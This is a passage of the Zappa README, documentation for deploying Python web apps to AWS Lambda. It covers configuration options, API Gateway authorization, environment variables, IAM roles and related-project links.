\/\/ Maximum lifespan for the Lambda function (default 30, max 900.)\n        \"touch\": true, \/\/ GET the production URL upon initial deployment (default True)\n        \"touch_path\": \"\/\", \/\/ The endpoint path to GET when checking the initial deployment (default \"\/\")\n        \"use_precompiled_packages\": true, \/\/ If possible, use C-extension packages which have been pre-compiled for AWS Lambda. Default true.\n        \"vpc_config\": { \/\/ Optional Virtual Private Cloud (VPC) configuration for Lambda function\n            \"SubnetIds\": [ \"subnet-12345678\" ], \/\/ Note: not all availability zones support Lambda!\n            \"SecurityGroupIds\": [ \"sg-12345678\" ]\n        },\n        \"xray_tracing\": false \/\/ Optional, enable AWS X-Ray tracing on your lambda function.\n    }\n}\n```\n\n#### YAML Settings\n\nIf you prefer YAML over JSON, you can also use a `zappa_settings.yml`, like so:\n\n```yaml\n---\ndev:\n  app_function: your_module.your_app\n  s3_bucket: your-code-bucket\n  events:\n  - function: your_module.your_function\n    event_source:\n      arn: arn:aws:s3:::your-event-bucket\n      events:\n      - s3:ObjectCreated:*\n```\n\nYou can also supply a custom settings file at any time with the `-s` argument, ex:\n\n```\n$ zappa deploy dev -s my-custom-settings.yml\n```\n\nSimilarly, you can supply a `zappa_settings.toml` file:\n\n```toml\n[dev]\n  app_function = \"your_module.your_app\"\n  s3_bucket = \"your-code-bucket\"\n```\n\n## Advanced Usage\n\n### Keeping The Server Warm\n\nZappa will automatically set up a regularly occurring execution of your application in order to keep the Lambda function warm. This can be disabled via the `keep_warm` setting.\n\n#### Serving Static Files \/ Binary Uploads\n\nZappa is now able to serve and receive binary files, as detected by their MIME-type.\n\nHowever, generally Zappa is designed for running your application code, not for serving static web assets. If you plan on serving custom static assets in your web application (CSS\/JavaScript\/images\/etc.,), you'll likely want to use a combination of AWS S3 and AWS CloudFront.\n\nYour web application framework will likely be able to handle this for you automatically. For Flask, there is [Flask-S3](https:\/\/github.com\/e-dard\/flask-s3), and for Django, there is [Django-Storages](https:\/\/django-storages.readthedocs.io\/en\/latest\/).\n\nSimilarly, you may want to design your application so that static binary uploads go [directly to S3](http:\/\/docs.aws.amazon.com\/AWSJavaScriptSDK\/guide\/browser-examples.html#Uploading_a_local_file_using_the_File_API), which then triggers an event response defined in your `events` setting! That's thinking serverlessly!\n\n### Enabling CORS\n\nThe simplest way to enable CORS (Cross-Origin Resource Sharing) for your Zappa application is to set `cors` to `true` in your Zappa settings file and update, which is the equivalent of pushing the \"Enable CORS\" button in the AWS API Gateway console. This is disabled by default, but you may wish to enable it for APIs which are accessed from other domains, etc.\n\nYou can also simply handle CORS directly in your application. Your web framework will probably have an extension to do this, such as [django-cors-headers](https:\/\/github.com\/ottoyiu\/django-cors-headers) or [Flask-CORS](https:\/\/github.com\/corydolphin\/flask-cors). Using these will make your code more portable.\n\n### Large Projects\n\nAWS currently limits Lambda zip sizes to 50 megabytes. If your project is larger than that, set `slim_handler: true` in your `zappa_settings.json`. In this case, your fat application package will be replaced with a small handler-only package. The handler file then pulls the rest of the large project down from S3 at run time! The initial load of the large project may add to startup overhead, but the difference should be minimal on a warm lambda function. Note that this will also eat into the storage space of your application function. Note that AWS currently [limits](https:\/\/docs.aws.amazon.com\/lambda\/latest\/dg\/limits.html) the `\/tmp` directory storage to 512 MB, so your project must still be smaller than that.\n\n### Enabling Bash Completion\n\nBash completion can be enabled by adding the following to your .bashrc:\n\n```bash\n  eval \"$(register-python-argcomplete zappa)\"\n```\n\n`register-python-argcomplete` is provided by the argcomplete Python package. If this package was installed in a virtualenv\nthen the command must be run there. Alternatively you can execute:\n\n  activate-global-python-argcomplete --dest=- > file\n\nThe file's contents should then be sourced in e.g. ~\/.bashrc.\n\n### Enabling Secure Endpoints on API Gateway\n\n#### API Key\n\nYou can use the `api_key_required` setting to generate an API key to all the routes of your API Gateway. The process is as follows:\n1. Deploy\/redeploy (update won't work) and write down the *id* for the key that has been created\n2. Go to AWS console > Amazon API Gateway and\n    * select \"API Keys\" and find the key *value* (for example `key_value`)\n    * select \"Usage Plans\", create a new usage plan and link the API Key and the API that Zappa has created for you\n3. Send a request where you pass the key value as a header called `x-api-key` to access the restricted endpoints (for example with curl: `curl --header \"x-api-key: key_value\"`). Note that without the x-api-key header, you will receive a 403.\n\n#### IAM Policy\n\nYou can enable IAM-based (v4 signing) authorization on an API by setting the `iam_authorization` setting to `true`. Your API will then require signed requests and access can be controlled via [IAM policy](https:\/\/docs.aws.amazon.com\/apigateway\/latest\/developerguide\/api-gateway-iam-policy-examples.html). Unsigned requests will receive a 403 response, as will requesters who are not authorized to access the API. Enabling this will override the Authorizer configuration (see below).\n\n#### API Gateway Lambda Authorizers\nIf you deploy an API endpoint with Zappa, you can take advantage of [API Gateway Lambda Authorizers](https:\/\/docs.aws.amazon.com\/apigateway\/latest\/developerguide\/apigateway-use-lambda-authorizer.html) to implement a token-based authentication - all you need to do is to provide a function to create the required output, Zappa takes care of the rest. A good start for the function is the [AWS Labs blueprint example](https:\/\/github.com\/awslabs\/aws-apigateway-lambda-authorizer-blueprints\/blob\/master\/blueprints\/python\/api-gateway-authorizer-python.py).\n\nIf you are wondering for what you would use an Authorizer, here are some potential use cases:\n\n1. Call out to OAuth provider\n2. Decode a JWT token inline\n3. Lookup in a self-managed DB (for example DynamoDB)\n\nZappa can be configured to call a function inside your code to do the authorization, or to call some other existing lambda function (which lets you share the authorizer between multiple lambdas). You control the behavior by specifying either the `arn` or `function_name` values in the `authorizer` settings block.\n\nFor example, to get the Cognito identity, add this to a `zappa_settings.yaml`:\n\n```yaml\n  context_header_mappings:\n    user_id: authorizer.user_id\n```\n\nWhich can now be accessed in Flask like this:\n\n```python\nfrom flask import request\n\n@route('\/hello')\ndef hello_world:\n   print(request.headers.get('user_id'))\n```\n\n#### Cognito User Pool Authorizer\n\nYou can also use AWS Cognito User Pool Authorizer by adding:\n\n```javascript\n{\n    \"authorizer\": {\n        \"type\": \"COGNITO_USER_POOLS\",\n        \"provider_arns\": [\n            \"arn:aws:cognito-idp:{region}:{account_id}:userpool\/{user_pool_id}\"\n        ]\n    }\n}\n```\n\n#### API Gateway Resource Policy\n\nYou can also use API Gateway Resource Policies. Example of IP Whitelisting:\n\n```javascript\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": \"*\",\n            \"Action\": \"execute-api:Invoke\",\n            \"Resource\": \"execute-api:\/*\",\n            \"Condition\": {\n                \"IpAddress\": {\n                    \"aws:SourceIp\": [\n                        \"1.2.3.4\/32\"\n                    ]\n                }\n            }\n        }\n    ]\n}\n```\n\n### Setting Environment Variables\n\n#### Local Environment Variables\n\nIf you want to set local environment variables for a deployment stage, you can simply set them in your `zappa_settings.json`:\n\n```javascript\n{\n    \"dev\": {\n        ...\n        \"environment_variables\": {\n            \"your_key\": \"your_value\"\n        }\n    },\n    ...\n}\n```\n\nYou can then access these inside your application with:\n\n```python\nimport os\nyour_value = os.environ.get('your_key')\n```\n\nIf your project needs to be aware of the type of environment you're deployed to, you'll also be able to get `SERVERTYPE` (AWS Lambda), `FRAMEWORK` (Zappa), `PROJECT` (your project name) and `STAGE` (_dev_, _production_, etc.) variables at any time.\n\n#### Remote AWS Environment Variables\n\nIf you want to use native AWS Lambda environment variables you can use the `aws_environment_variables` configuration setting. These are useful as you can easily change them via the AWS Lambda console or cli at runtime. They are also useful for storing sensitive credentials and to take advantage of KMS encryption of environment variables.\n\n\nDuring development, you can add your Zappa defined variables to your locally running app by, for example, using the below (for Django, to manage.py).\n\n```python\nif 'SERVERTYPE' in os.environ and os.environ['SERVERTYPE'] == 'AWS Lambda':\n    import json\n    import os\n    json_data = open('zappa_settings.json')\n    env_vars = json.load(json_data)['dev']['environment_variables']\n    for key, val in env_vars.items():\n        os.environ[key] = val\n\n```\n\n#### Remote Environment Variables\n\nAny environment variables that you have set outside of Zappa (via AWS Lambda console or cli) will remain as they are when running `update`, unless they are also in `aws_environment_variables`, in which case the remote value will be overwritten by the one in the settings file. If you are using KMS-encrypted AWS environment variables, you can set your KMS Key ARN in the `aws_kms_key_arn` setting. Make sure that the values you set are encrypted in such case.\n\n_Note: if you rely on these as well as `environment_variables`, and you have the same key names, then those in `environment_variables` will take precedence as they are injected in the lambda handler._\n\n#### Remote Environment Variables (via an S3 file)\n\n_S3 remote environment variables were added to Zappa before AWS introduced native environment variables for Lambda (via the console and cli). Before going down this route check if above make more sense for your usecase._\n\n\nIf you want to use remote environment variables to configure your application (which is especially useful for things like sensitive credentials), you can create a file and place it in an S3 bucket to which your Zappa application has access. To do this, add the `remote_env` key to zappa_settings pointing to a file containing a flat JSON object, so that each key-value pair on the object will be set as an environment variable and value whenever a new lambda instance spins up.\n\nFor example, to ensure your application has access to the database credentials without storing them in your version control, you can add a file to S3 with the connection string and load it into the lambda environment using the `remote_env` configuration setting.\n\nsuper-secret-config.json (uploaded to my-config-bucket):\n```javascript\n{\n    \"DB_CONNECTION_STRING\": \"super-secret:database\"\n}\n```\n\nzappa_settings.json:\n```javascript\n{\n    \"dev\": {\n        ...\n        \"remote_env\": \"s3:\/\/my-config-bucket\/super-secret-config.json\",\n    },\n    ...\n}\n```\n\nNow in your application you can use:\n```python\nimport os\ndb_string = os.environ.get('DB_CONNECTION_STRING')\n```\n\n### API Gateway Context Variables\n\nIf you want to map an API Gateway context variable (http:\/\/docs.aws.amazon.com\/apigateway\/latest\/developerguide\/api-gateway-mapping-template-reference.html) to an HTTP header you can set up the mapping in `zappa_settings.json`:\n\n```javascript\n{\n    \"dev\": {\n        ...\n        \"context_header_mappings\": {\n            \"HTTP_header_name\": \"API_Gateway_context_variable\"\n        }\n    },\n    ...\n}\n```\n\nFor example, if you want to expose the $context.identity.cognitoIdentityId variable as the HTTP header CognitoIdentityId, and $context.stage as APIStage, you would have:\n\n```javascript\n{\n    \"dev\": {\n        ...\n        \"context_header_mappings\": {\n            \"CognitoIdentityId\": \"identity.cognitoIdentityId\",\n            \"APIStage\": \"stage\"\n        }\n    },\n    ...\n}\n```\n\n### Catching Unhandled Exceptions\n\nBy default, if an _unhandled_ exception happens in your code, Zappa will just print the stacktrace into a CloudWatch log. If you wish to use an external reporting tool to take note of those exceptions, you can use the `exception_handler` configuration option.\n\nzappa_settings.json:\n```javascript\n{\n    \"dev\": {\n        ...\n        \"exception_handler\": \"your_module.unhandled_exceptions\",\n    },\n    ...\n}\n```\n\nThe function has to accept three arguments: exception, event, and context:\n\nyour_module.py\n```python\ndef unhandled_exceptions(e, event, context):\n    send_to_raygun(e, event)  # gather data you need and send\n    return True # Prevent invocation retry\n```\nYou may still need a similar exception handler inside your application, this is just a way to catch exception which happen at the Zappa\/WSGI layer (typically event-based invocations, misconfigured settings, bad Lambda packages, and permissions issues).\n\nBy default, AWS Lambda will attempt to retry an event based (non-API Gateway, e.g. CloudWatch) invocation if an exception has been thrown. However, you can prevent this by returning True, as in example above, so Zappa that will not re-raise the uncaught exception, thus preventing AWS Lambda from retrying the current invocation.\n\n### Using Custom AWS IAM Roles and Policies\n\n#### Custom AWS IAM Roles and Policies for Deployment\n\nYou can specify which _local_ profile to use for deploying your Zappa application by defining\nthe `profile_name` setting, which will correspond to a profile in your AWS credentials file.\n\n#### Custom AWS IAM Roles and Policies for Execution\n\nThe default IAM policy created by Zappa for executing the Lambda is very permissive.\nIt grants access to all actions for\nall resources for types CloudWatch, S3, Kinesis, SNS, SQS, DynamoDB, and Route53; lambda:InvokeFunction\nfor all Lambda resources; Put to all X-Ray resources; and all Network Interface operations to all EC2\nresources. While this allows most Lambdas to work correctly with no extra permissions, it is\ngenerally not an acceptable set of permissions for most continuous integration pipelines or\nproduction deployments. Instead, you will probably want to manually manage your IAM policies.\n\nTo manually define the policy of your Lambda execution role, you must set *manage_roles* to false and define\neither the *role_name* or *role_arn* in your Zappa settings file.\n\n```javascript\n{\n    \"dev\": {\n        ...\n        \"manage_roles\": false, \/\/ Disable Zappa client managing roles.\n        \"role_name\": \"MyLambdaRole\", \/\/ Name of your Zappa execution role. Optional, default: <project_name>-<env>-ZappaExecutionRole.\n        \"role_arn\": \"arn:aws:iam::12345:role\/app-ZappaLambdaExecutionRole\", \/\/ ARN of your Zappa execution role. Optional.\n        ...\n    },\n    ...\n}\n```\n\nOngoing discussion about the minimum policy requirements necessary for a Zappa deployment [can be found here](https:\/\/github.com\/Miserlou\/Zappa\/issues\/244).\nA more robust solution to managing these entitlements will likely be implemented soon.\n\nTo add permissions to the default Zappa execution policy, use the `extra_permissions` setting:\n\n```javascript\n{\n    \"dev\": {\n        ...\n        \"extra_permissions\": [{ \/\/ Attach any extra permissions to this policy.\n            \"Effect\": \"Allow\",\n            \"Action\": [\"rekognition:*\"], \/\/ AWS Service ARN\n            \"Resource\": \"*\"\n        }]\n    },\n    ...\n}\n```\n\n### AWS X-Ray\n\nZappa can enable [AWS X-Ray](https:\/\/aws.amazon.com\/xray\/) support on your function with a configuration setting:\n\n```javascript\n{\n    \"dev\": {\n        ...\n        \"xray_tracing\": true\n    },\n    ...\n}\n```\n\nThis will enable it on the Lambda function and allow you to instrument your code with X-Ray.\nFor example, with Flask:\n\n```python\nfrom aws_xray_sdk.core import xray_recorder\n\napp = Flask(__name__)\n\nxray_recorder.configure(service='my_app_name')\n\n@route('\/hello')\n@xray_recorder.capture('hello')\ndef hello_world:\n    return 'Hello'\n```\n\nYou may use the capture decorator to create subsegments around functions, or `xray_recorder.begin_subsegment('subsegment_name')` and `xray_recorder.end_subsegment()` within a function. The official [X-Ray documentation for Python](http:\/\/docs.aws.amazon.com\/xray-sdk-for-python\/latest\/reference\/) has more information on how to use this with your code.\n\nNote that you may create subsegments in your code but an exception will be raised if you try to create a segment, as it is [created by the lambda worker](https:\/\/github.com\/aws\/aws-xray-sdk-python\/issues\/2). This also means that if you use Flask you must not use the [XRayMiddleware the documentation suggests](https:\/\/docs.aws.amazon.com\/xray\/latest\/devguide\/xray-sdk-python-middleware.html).\n\n### Globally Available Server-less Architectures\n\n\n<p align=\"center\">\n  <a href=\"https:\/\/htmlpreview.github.io\/?https:\/\/github.com\/Miserlou\/Talks\/blob\/master\/serverless-london\/global.html#0\"><img src=\"http:\/\/i.imgur.com\/oR61Qau.png\" alt=\"Global Zappa Slides\"\/><\/a>\n<\/p>\n<p align=\"center\">\n  <i>Click to see <a href=\"https:\/\/htmlpreview.github.io\/?https:\/\/github.com\/Miserlou\/Talks\/blob\/master\/serverless-london\/global.html#0\">slides from ServerlessConf London<\/a>!<\/i>\n<\/p>\n\nDuring the `init` process, you will be given the option to deploy your application \"globally.\" This will allow you to deploy your application to all available AWS regions simultaneously in order to provide a consistent global speed, increased redundancy, data isolation, and legal compliance. You can also choose to deploy only to \"primary\" locations, the AWS regions with `-1` in their names.\n\nTo learn more about these capabilities, see [these slides](https:\/\/htmlpreview.github.io\/?https:\/\/github.com\/Miserlou\/Talks\/blob\/master\/serverless-london\/global.html#0) from ServerlessConf London.\n\n### Raising AWS Service Limits\n\nOut of the box, AWS sets a limit of [1000 concurrent executions](http:\/\/docs.aws.amazon.com\/lambda\/latest\/dg\/limits.html) for your functions. If you start to breach these limits, you may start to see errors like `ClientError: An error occurred (LimitExceededException) when calling the PutTargets..\"` or something similar.\n\nTo avoid this, you can file a [service ticket](https:\/\/console.aws.amazon.com\/support\/home#\/) with Amazon to raise your limits up to the many tens of thousands of concurrent executions which you may need. This is a fairly common practice with Amazon, designed to prevent you from accidentally creating extremely expensive bug reports. So, before raising your service limits, make sure that you don't have any rogue scripts which could accidentally create tens of thousands of parallel executions that you don't want to pay for.\n\n### Using Zappa With Docker\n\nIf Docker is part of your team's CI, testing, or deployments, you may want to check out [this handy guide](https:\/\/blog.zappa.io\/posts\/simplified-aws-lambda-deployments-with-docker-and-zappa) on using Zappa with Docker.\n\n### Dead Letter Queues\n\nIf you want to utilise [AWS Lambda's Dead Letter Queue feature](http:\/\/docs.aws.amazon.com\/lambda\/latest\/dg\/dlq.html) simply add the key `dead_letter_arn`, with the value being the complete ARN to the corresponding SNS topic or SQS queue in your `zappa_settings.json`.\n\nYou must have already created the corresponding SNS\/SQS topic\/queue, and the Lambda function execution role must have been provisioned with read\/publish\/sendMessage access to the DLQ resource.\n\n### Unique Package ID\n\nFor monitoring of different deployments, a unique UUID for each package is available in `package_info.json` in the root directory of your application's package.  You can use this information or a hash of this file for such things as tracking errors across different deployments, monitoring status of deployments and other such things on services such as Sentry and New Relic. The package will contain:\n\n```json\n{\n  \"build_platform\": \"darwin\",\n  \"build_user\": \"frank\",\n  \"build_time\": \"1509732511\",\n  \"uuid\": \"9c2df9e6-30f4-4c0a-ac4d-4ecb51831a74\"\n}\n```\n\n### Application Load Balancer Event Source\n\nZappa can be used to handle events triggered by Application Load Balancers (ALB). This can be useful in a few circumstances:\n- Since API Gateway has a hard limit of 30 seconds before timing out, you can use an ALB for longer running requests.\n- API Gateway is billed per-request; therefore, costs can become excessive with high throughput services. ALBs pricing model makes much more sense financially if you're expecting a lot of traffic to your Lambda.\n- ALBs can be placed within a VPC, which may make more sense for private endpoints than using API Gateway's private model (using AWS PrivateLink).\n\nLike API Gateway, Zappa can automatically provision ALB resources for you.  You'll need to add the following to your `zappa_settings`:\n```\n\"alb_enabled\": true,\n\"alb_vpc_config\": {\n    \"CertificateArn\": \"arn:aws:acm:us-east-1:[your-account-id]:certificate\/[certificate-id]\",\n    \"SubnetIds\": [\n        \/\/ Here, you'll want to provide a list of subnets for your ALB, eg. 'subnet-02a58266'\n    ],\n    \"SecurityGroupIds\": [\n        \/\/ And here, a list of security group IDs, eg. 'sg-fbacb791'\n    ]\n}\n```\n\nMore information on using ALB as an event source for Lambda can be found [here](https:\/\/docs.aws.amazon.com\/elasticloadbalancing\/latest\/application\/lambda-functions.html).\n\n*An important note*: right now, Zappa will provision ONE lambda to ONE load balancer, which means using `base_path` along with ALB configuration is currently unsupported.\n\n### Endpoint Configuration\n\nAPI Gateway can be configured to be only accessible in a VPC. To enable this; [configure your VPC to support](https:\/\/docs.aws.amazon.com\/apigateway\/latest\/developerguide\/apigateway-private-apis.html) then set the `endpoint_configuration` to `PRIVATE` and set up Resource Policy on the API Gateway. A note about this; if you're using a private endpoint, Zappa won't be able to tell if the API is returning a successful status code upon deploy or update, so you'll have to check it manually to ensure your setup is working properly.\n\nFor full list of options for endpoint configuration refer to [API Gateway EndpointConfiguration documentation](https:\/\/docs.aws.amazon.com\/AWSCloudFormation\/latest\/UserGuide\/aws-properties-apigateway-restapi-endpointconfiguration.html)\n\n#### Example Private API Gateway configuration\n\nzappa_settings.json:\n```json\n{\n    \"dev\": {\n        ...\n        \"endpoint_configuration\": [\"PRIVATE\"],\n        \"apigateway_policy\": \"apigateway_resource_policy.json\",\n        ...\n    },\n    ...\n}\n```\n\napigateway_resource_policy.json:\n```json\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Deny\",\n            \"Principal\": \"*\",\n            \"Action\": \"execute-api:Invoke\",\n            \"Resource\": \"execute-api:\/*\",\n            \"Condition\": {\n                \"StringNotEquals\": {\n                    \"aws:sourceVpc\": \"{{vpcID}}\" \/\/ UPDATE ME\n                }\n            }\n        },\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": \"*\",\n            \"Action\": \"execute-api:Invoke\",\n            \"Resource\": \"execute-api:\/*\"\n        }\n    ]\n}\n```\n\n## Zappa Guides\n\n* [Django-Zappa tutorial (screencast)](https:\/\/www.youtube.com\/watch?v=plUrbPN0xc8&feature=youtu.be).\n* [Using Django-Zappa, Part 1](https:\/\/serverlesscode.com\/post\/zappa-wsgi-for-python\/).\n* [Using Django-Zappa, Part 2: VPCs](https:\/\/serverlesscode.com\/post\/zappa-wsgi-for-python-pt-2\/).\n* [Building Serverless Microservices with Zappa and Flask](https:\/\/gun.io\/blog\/serverless-microservices-with-zappa-and-flask\/)\n* [Zappa \u3067 Hello World \u3059\u308b\u307e\u3067 (Japanese)](http:\/\/qiita.com\/satoshi_iwashita\/items\/505492193317819772c7)\n* [How to Deploy Zappa with CloudFront, RDS and VPC](https:\/\/jinwright.net\/how-deploy-serverless-wsgi-app-using-zappa\/)\n* [Secure 'Serverless' File Uploads with AWS Lambda, S3, and Zappa](http:\/\/blog.stratospark.com\/secure-serverless-file-uploads-with-aws-lambda-s3-zappa.html)\n* [Deploy a Serverless WSGI App using Zappa, CloudFront, RDS, and VPC](https:\/\/docs.google.com\/presentation\/d\/1aYeOMgQl4V_fFgT5VNoycdXtob1v6xVUWlyxoTEiTw0\/edit#slide=id.p)\n* [AWS: Deploy Alexa Ask Skills with Flask-Ask and Zappa](https:\/\/developer.amazon.com\/blogs\/post\/8e8ad73a-99e9-4c0f-a7b3-60f92287b0bf\/New-Alexa-Tutorial-Deploy-Flask-Ask-Skills-to-AWS-Lambda-with-Zappa)\n* [Guide to using Django with Zappa](https:\/\/edgarroman.github.io\/zappa-django-guide\/)\n* [Zappa and LambCI](https:\/\/seancoates.com\/blogs\/zappa-and-lambci\/)\n* [Building A Serverless Image Processing SaaS using Zappa](https:\/\/medium.com\/99serverless\/building-a-serverless-image-processing-saas-9ef68b594076)\n* [Serverless Slack Slash Commands with Python and Zappa](https:\/\/renzo.lucioni.xyz\/serverless-slash-commands-with-python\/)\n* [Bringing Tokusatsu to AWS using Python, Flask, Zappa and Contentful](https:\/\/www.contentful.com\/blog\/2018\/03\/07\/bringing-tokusatsu-to-aws-using-python-flask-zappa-and-contentful\/)\n* [AWS Summit 2018 Seoul - Zappa\uc640 \ud568\uaed8\ud558\ub294 Serverless Microservice](https:\/\/www.slideshare.net\/YunSeopSong\/zappa-serverless-microservice-94410308\/)\n* [Book - Building Serverless Python Web Services with Zappa](https:\/\/github.com\/PacktPublishing\/Building-Serverless-Python-Web-Services-with-Zappa)\n* _Your guide here?_\n\n## Zappa in the Press\n\n* _[Zappa Serves Python, Minus the Servers](http:\/\/www.infoworld.com\/article\/3031665\/application-development\/zappa-serves-python-web-apps-minus-the-servers.html)_\n* _[Zappa lyfter serverl\u00f6sa applikationer med Python](http:\/\/computersweden.idg.se\/2.2683\/1.649895\/zappa-lyfter-python)_\n* _[Interview: Rich Jones on Zappa](https:\/\/serverlesscode.com\/post\/rich-jones-interview-django-zappa\/)_\n* [Top 10 Python Libraries of 2016](https:\/\/tryolabs.com\/blog\/2016\/12\/20\/top-10-python-libraries-of-2016\/)\n\n## Sites Using Zappa\n\n* [Zappa.io](https:\/\/www.zappa.io) - A simple Zappa homepage\n* [Zappatista!](https:\/\/blog.zappa.io) - The official Zappa blog!\n* [Mailchimp Signup Utility](https:\/\/github.com\/sasha42\/Mailchimp-utility) - A microservice for adding people to a mailing list via API.\n* [Zappa Slack Inviter](https:\/\/github.com\/Miserlou\/zappa-slack-inviter) - A tiny, server-less service for inviting new users to your Slack channel.\n* [Serverless Image Host](https:\/\/github.com\/Miserlou\/serverless-imagehost) - A thumbnailing service with Flask, Zappa and Pillow.\n* [Zappa BitTorrent Tracker](https:\/\/github.com\/Miserlou\/zappa-bittorrent-tracker) - An experimental server-less BitTorrent tracker. Work in progress.\n* [JankyGlance](https:\/\/github.com\/Miserlou\/JankyGlance) - A server-less Yahoo! Pipes replacement.\n* [LambdaMailer](https:\/\/github.com\/tryolabs\/lambda-mailer) - A server-less endpoint for processing a contact form.\n* [Voter Registration Microservice](https:\/\/topics.arlingtonva.us\/2016\/11\/voter-registration-search-microservice\/) - Official backup to to the Virginia Department of Elections portal.\n* [FreePoll Online](https:\/\/www.freepoll.online) - A simple and awesome say for groups to make decisions.\n* [PasteOfCode](https:\/\/paste.ofcode.org\/) - A Zappa-powered paste bin.\n* And many more, including banks, governments, startups, enterprises and schools!\n\nAre you using Zappa? Let us know and we'll list your site here!\n\n## Related Projects\n\n* [lambda-packages](http:\/\/github.com\/Miserlou\/lambda-packages) - Precompiled C-extension packages for AWS Lambda. Used automatically by Zappa.\n* [Mackenzie](http:\/\/github.com\/Miserlou\/Mackenzie) - AWS Lambda Infection Toolkit\n* [NoDB](https:\/\/github.com\/Miserlou\/NoDB) - A simple, server-less, Pythonic object store based on S3.\n* [zappa-cms](http:\/\/github.com\/Miserlou\/zappa-cms) - A tiny server-less CMS for busy hackers. Work in progress.\n* [zappa-django-utils](https:\/\/github.com\/Miserlou\/zappa-django-utils) - Utility commands to help Django deployments.\n* [flask-ask](https:\/\/github.com\/johnwheeler\/flask-ask) - A framework for building Amazon Alexa applications. Uses Zappa for deployments.\n* [zappa-file-widget](https:\/\/github.com\/anush0247\/zappa-file-widget) - A Django plugin for supporting binary file uploads in Django on Zappa.\n* [zops](https:\/\/github.com\/bjinwright\/zops) - Utilities for teams and continuous integrations using Zappa.\n* [cookiecutter-mobile-backend](https:\/\/github.com\/narfman0\/cookiecutter-mobile-backend\/) - A `cookiecutter` Django project with Zappa and S3 uploads support.\n* [zappa-examples](https:\/\/github.com\/narfman0\/zappa-examples\/) - Flask, Django, image uploads, and more!\n* [zappa-hug-example](https:\/\/github.com\/mcrowson\/zappa-hug-example) - Example of a Hug application using Zappa.\n* [Zappa Docker Image](https:\/\/github.com\/danielwhatmuff\/zappa) - A Docker image for running Zappa locally, based on Lambda Docker.\n* [zappa-dashing](https:\/\/github.com\/nikos\/zappa-dashing) - Monitor your AWS environment (health\/metrics) with Zappa and CloudWatch.\n* [s3env](https:\/\/github.com\/cameronmaske\/s3env) - Manipulate a remote Zappa environment variable key\/value JSON object file in an S3 bucket through the CLI.\n* [zappa_resize_image_on_fly](https:\/\/github.com\/wobeng\/zappa_resize_image_on_fly) - Resize images on the fly using Flask, Zappa, Pillow, and OpenCV-python.\n* [zappa-ffmpeg](https:\/\/github.com\/ubergarm\/zappa-ffmpeg) - Run ffmpeg inside a lambda for serverless transformations.\n* [gdrive-lambda](https:\/\/github.com\/richiverse\/gdrive-lambda) - pass json data to a csv file for end users who use Gdrive across the organization.\n* [travis-build-repeat](https:\/\/github.com\/bcongdon\/travis-build-repeat) - Repeat TravisCI builds to avoid stale test results.\n* [wunderskill-alexa-skill](https:\/\/github.com\/mcrowson\/wunderlist-alexa-skill) - An Alexa skill for adding to a Wunderlist.\n* [xrayvision](https:\/\/github.com\/mathom\/xrayvision) - Utilities and wrappers for using AWS X-Ray with Zappa.\n* [terraform-aws-zappa](https:\/\/github.com\/dpetzold\/terraform-aws-zappa) - Terraform modules for creating a VPC, RDS instance, ElastiCache Redis and CloudFront Distribution for use with Zappa.\n* [zappa-sentry](https:\/\/github.com\/jneves\/zappa-sentry) - Integration with Zappa and Sentry\n* [IOpipe](https:\/\/github.com\/iopipe\/iopipe-python#zappa) - Monitor, profile and analyze your Zappa apps.\n\n\n## Hacks\n\nZappa goes quite far beyond what Lambda and API Gateway were ever intended to handle. As a result, there are quite a few hacks in here that allow it to work. Some of those include, but aren't limited to..\n\n* Using VTL to map body, headers, method, params and query strings into JSON, and then turning that into valid WSGI.\n* Attaching response codes to response bodies, Base64 encoding the whole thing, using that as a regex to route the response code, decoding the body in VTL, and mapping the response body to that.\n* Packing and _Base58_ encoding multiple cookies into a single cookie because we can only map one kind.\n* Forcing the case permutations of \"Set-Cookie\" in order to return multiple headers at the same time.\n* Turning cookie-setting 301\/302 responses into 200 responses with HTML redirects, because we have no way to set headers on redirects.\n\n## Contributing\n\nThis project is still young, so there is still plenty to be done. Contributions are more than welcome!\n\nPlease file tickets for discussion before submitting patches. Pull requests should target `master` and should leave Zappa in a \"shippable\" state if merged.\n\nIf you are adding a non-trivial amount of new code, please include a functioning test in your PR. For AWS calls, we use the `placebo` library, which you can learn to use [in their README](https:\/\/github.com\/garnaat\/placebo#usage-as-a-decorator). The test suite will be run by [Travis CI](https:\/\/travis-ci.org\/Miserlou\/Zappa) once you open a pull request.\n\nPlease include the GitHub issue or pull request URL that has discussion related to your changes as a comment in the code ([example](https:\/\/github.com\/Miserlou\/Zappa\/blob\/fae2925431b820eaedf088a632022e4120a29f89\/zappa\/zappa.py#L241-L243)). This greatly helps for project maintainability, as it allows us to trace back use cases and explain decision making. Similarly, please make sure that you meet all of the requirements listed in the [pull request template](https:\/\/raw.githubusercontent.com\/Miserlou\/Zappa\/master\/.github\/PULL_REQUEST_TEMPLATE.md).\n\nPlease feel free to work on any open ticket, especially any ticket marked with the \"help-wanted\" label. If you get stuck or want to discuss an issue further, please join [our Slack channel](https:\/\/slack.zappa.io), where you'll find a community of smart and interesting people working dilligently on hard problems.\n\nZappa does not intend to conform to PEP8, isolate your commits so that changes to functionality with changes made by your linter.\n\n#### Using a Local Repo\n\nTo use the git HEAD, you *probably can't* use `pip install -e `. Instead, you should clone the repo to your machine and then `pip install \/path\/to\/zappa\/repo` or `ln -s \/path\/to\/zappa\/repo\/zappa zappa` in your local project.\n\n## Patrons\n\nIf you or your company uses **Zappa**, please consider giving what you can to support the ongoing development of the project!\n\nYou can become a patron by **[visiting our Patreon page](https:\/\/patreon.com\/zappa)**.\n\nZappa is currently supported by these awesome individuals and companies:\n\n  * Nathan Lawrence\n  * LaunchLab\n  * Sean Paley\n  * Theo Chitayat\n  * George Sibble\n  * Joe Weiss\n  * Nik Bora\n  * Zerong Toby Wang\n  * Gareth E\n  * Matt Jackson\n  * Sean Coates\n  * Alexander Loschilov\n  * Korey Peters\n  * Joe Weiss\n  * Kimmo Parvianen-Jalanko\n  * Patrick Agin\n  * Roberto Martinez\n  * Charles Dimino\n  * Doug Beney\n  * Dan \"The Man\" Gayle\n  * Juancito\n  * Will Childs-Klein\n  * Efi Merdler Kravitz\n  * **Philippe Trounev**\n\nThank you very, very much!\n\n## Merch\n\n<br \/>\n<p align=\"center\">\n  <a href=\"https:\/\/blog.zappa.io\/posts\/weve-got-merch-now-introducing-zappa-tshirts\"><img 